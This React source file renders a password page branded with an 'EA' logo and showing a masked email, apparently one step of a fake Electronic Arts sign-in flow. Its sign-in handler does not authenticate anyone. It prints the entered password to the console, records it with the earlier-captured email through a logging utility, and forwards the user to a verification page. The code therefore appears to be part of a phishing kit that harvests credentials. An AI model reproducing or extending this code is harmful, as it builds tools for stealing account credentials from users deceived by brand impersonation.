import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { ArrowLeft, Eye, EyeOff } from 'lucide-react'
import { appendLog, getLastEmail } from '../utils/logger'
import { maskEmail } from '../utils/emailMask'
import EALogo from './EALogo'

const PasswordScreen: React.FC = () => {
  const navigate = useNavigate()
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)

  console.log('PasswordScreen rendered')

  const handleBack = () => {
    console.log('Back button clicked')
    navigate('/login')
  }

  const handleSignIn = () => {
    console.log('Sign in with password:', password)
    const email = getLastEmail() || undefined
    appendLog({ page: 'password', password, email })
    // Here you would typically handle the authentication
    navigate('/verify')
  }

  const handleForgotPassword = () => {
    console.log('Forgot password clicked')
  }

  return (
    <div className="max-w-[36rem] mx-auto bg-transparent min-h-screen relative">
      {/* Header with Back Button */}
      <div className="px-6 pt-12">
        <button
          onClick={handleBack}
          className="flex items-center space-x-2 text-white bg-slate-700 hover:bg-slate-600 px-4 py-2 rounded-lg transition-colors"
        >
          <ArrowLeft size={20} />
          <span className="font-medium tracking-wider">BACK</span>
        </button>
      </div>

      {/* Main Content */}
      <div className="px-6 pt-8">
        {/* EA Logo */}
        <div className="w-full flex justify-center mb-12">
          <EALogo />
        </div>

        {/* Title */}
        <h1 className="text-white text-3xl font-light text-center mb-8">
          Enter your password
        </h1>

        {/* Subtitle */}
        <div className="text-center mb-12">
          <p className="text-gray-300 text-lg mb-2">Enter your password</p>
          <p className="text-gray-300 text-lg">
            for <span className="underline">{maskEmail(getLastEmail()) ?? 'your email'}</span>
          </p>
        </div>

        {/* Password Form */}
        <div className="space-y-8">
          <div>
            <label className="block text-gray-300 text-sm font-medium mb-3 uppercase tracking-wider">
              Password
            </label>
            <div className="relative">
              <input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => {
                  console.log('Password input changed')
                  setPassword(e.target.value)
                }}
                placeholder="Enter your password"
                className="w-full px-4 py-4 pr-12 bg-transparent border-2 border-slate-600 rounded-xl text-white placeholder-slate-500 focus:border-blue-500 focus:outline-none transition-colors"
              />
              <button
                type="button"
                onClick={() => {
                  console.log('Toggle password visibility')
                  setShowPassword(!showPassword)
                }}
                className="absolute right-4 top-1/2 transform -translate-y-1/2 text-slate-400 hover:text-white transition-colors"
              >
                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
              </button>
            </div>
          </div>

          {/* Sign In Button */}
          <button
            onClick={handleSignIn}
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-4 rounded-xl transition-colors text-lg tracking-wider"
          >
            SIGN IN
          </button>
        </div>

        {/* Forgot Password Link */}
        <div className="text-center mt-12">
          <button 
            onClick={handleForgotPassword}
            className="text-blue-400 text-lg hover:text-blue-300 transition-colors"
          >
            Forgot your password, or need to create a new one?
          </button>
        </div>
      </div>
    </div>
  )
}

export default PasswordScreen